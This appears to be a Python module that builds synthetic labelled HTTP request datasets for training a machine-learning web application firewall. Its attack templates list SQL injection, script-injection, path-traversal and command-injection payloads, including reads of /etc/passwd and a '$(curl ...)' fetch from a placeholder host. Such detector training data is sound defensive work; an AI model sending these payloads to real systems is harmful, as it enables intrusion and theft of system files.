from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass

from waf.core.models import RequestEnvelope
from waf.features.http_v2 import ProductionHTTPFeatureExtractor


@dataclass(frozen=True, slots=True)
class DatasetBundle:
    X: list[list[float]]
    y: list[int]
    feature_names: tuple[str, ...]
    dataset_version: str


def _rid(seed: int, i: int) -> str:
    return hashlib.sha256(f"{seed}:{i}".encode()).hexdigest()[:16]


def _vector(extractor: ProductionHTTPFeatureExtractor, req: RequestEnvelope, names: tuple[str, ...] | None):
    fv = extractor.extract(req)
    next_names = tuple(sorted(fv.values)) if names is None else names
    if tuple(sorted(fv.values)) != next_names:
        raise ValueError("feature schema changed during dataset construction")
    return [fv.values[name] for name in next_names], next_names


def build_training_dataset(samples: int = 5000, seed: int = 42) -> DatasetBundle:
    rng = random.Random(seed)
    extractor = ProductionHTTPFeatureExtractor()
    rows: list[list[float]] = []
    labels: list[int] = []
    feature_names: tuple[str, ...] | None = None
    benign_templates = (
        ("GET", "/", ""), ("GET", "/health", ""), ("GET", "/products", "page=1"),
        ("GET", "/products/42", ""), ("GET", "/search", "q=shoes"),
        ("GET", "/search", "q=blue+shoes&page=2"), ("GET", "/api/item/17", "q=17"),
        ("GET", "/api/item/103", "q=103"), ("GET", "/api/items", "page=3&limit=20"),
        ("POST", "/api/login", ""), ("POST", "/api/items", ""), ("PUT", "/api/profile", ""),
        ("PATCH", "/api/profile", "fields=name"), ("DELETE", "/api/cart/12", "confirm=true"),
    )
    attack_templates = (
        ("GET", "/search", "q=1+UNION+SELECT+password+FROM+users"),
        ("GET", "/search", "q=%27%20OR%201%3D1"),
        ("POST", "/comment", "", b"<script>alert(document.domain)</script>"),
        ("GET", "/", "q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
        ("GET", "/../../etc/passwd", ""), ("GET", "/download/%2e%2e/%2e%2e/config", ""),
        ("POST", "/api/import", "", b"x=1;cat /etc/passwd"),
        ("POST", "/api/run", "", b"$(curl http://example.invalid/x)"),
    )
    for i in range(max(64, samples)):
        if i % 2:
            tpl = attack_templates[rng.randrange(len(attack_templates))]
            method, path, query = tpl[:3]
            body = tpl[3] if len(tpl) > 3 else b""
            if not body and rng.random() < 0.15:
                body = b"x=" + ("A" * rng.randint(20, 120)).encode()
            labels.append(1)
        else:
            method, path, query = benign_templates[rng.randrange(len(benign_templates))]
            body = b""
            if method in {"POST", "PUT", "PATCH"} and rng.random() < 0.55:
                body = b'{"name":"item-%d","value":%d}' % (rng.randint(1, 100), rng.randint(1, 1000))
            labels.append(0)
        headers = {"User-Agent": rng.choice(("Mozilla/5.0", "Chrome", "MobileBrowser", "phase4-dataset"))}
        if body.startswith(b"{"):
            headers["Content-Type"] = "application/json"
        elif body:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = RequestEnvelope(_rid(seed, i), method, "https" if rng.random() < 0.7 else "http", "example.test", path, query, headers, body)
        vector, feature_names = _vector(extractor, req, feature_names)
        rows.append(vector)
    return DatasetBundle(rows[:samples], labels[:samples], feature_names or (), f"synthetic-http-v4-s{samples}-seed{seed}")


def build_benign_baseline(samples: int = 2200, seed: int = 123):
    rng = random.Random(seed)
    extractor = ProductionHTTPFeatureExtractor()
    templates = (
        ("GET", "/", ""), ("GET", "/health", ""), ("GET", "/products", "page=1"),
        ("GET", "/products/42", ""), ("GET", "/search", "q=shoes"),
        ("GET", "/search", "q=blue+shoes&page=2"), ("GET", "/api/item/17", "q=17"),
        ("GET", "/api/items", "page=3&limit=20"), ("POST", "/api/login", ""),
        ("POST", "/api/items", ""), ("PUT", "/api/profile", ""), ("PATCH", "/api/profile", "fields=name"),
        ("DELETE", "/api/cart/12", "confirm=true"),
    )
    names = None
    rows = []
    for i in range(max(64, samples)):
        method, path, query = rng.choice(templates)
        if rng.random() < 0.18:
            query = f"page={rng.randint(1,20)}&limit={rng.choice((10,20,50))}"
        body = b""
        headers: dict[str, str] = {}
        if rng.random() < 0.82:
            headers["User-Agent"] = rng.choice(("Mozilla/5.0", "Chrome", "MobileBrowser", "phase4-client"))
        if rng.random() < 0.48:
            headers["Accept"] = rng.choice(("application/json", "text/html", "*/*"))
        if method in {"POST", "PUT", "PATCH"} and rng.random() < 0.62:
            body = (f'{{"name":"item-{rng.randint(1,100)}","value":{rng.randint(1,1000)}}}').encode()
            headers["Content-Type"] = "application/json"
            if rng.random() < 0.35:
                headers["Content-Length"] = str(len(body))
        req = RequestEnvelope(_rid(seed, i), method, rng.choice(("http", "https")), rng.choice(("example.test", "api.example.test", "shop.example.test")), path, query, headers, body)
        vector, names = _vector(extractor, req, names)
        rows.append(vector)
    return rows[:samples], names or (), f"benign-baseline-v4-s{samples}-seed{seed}"
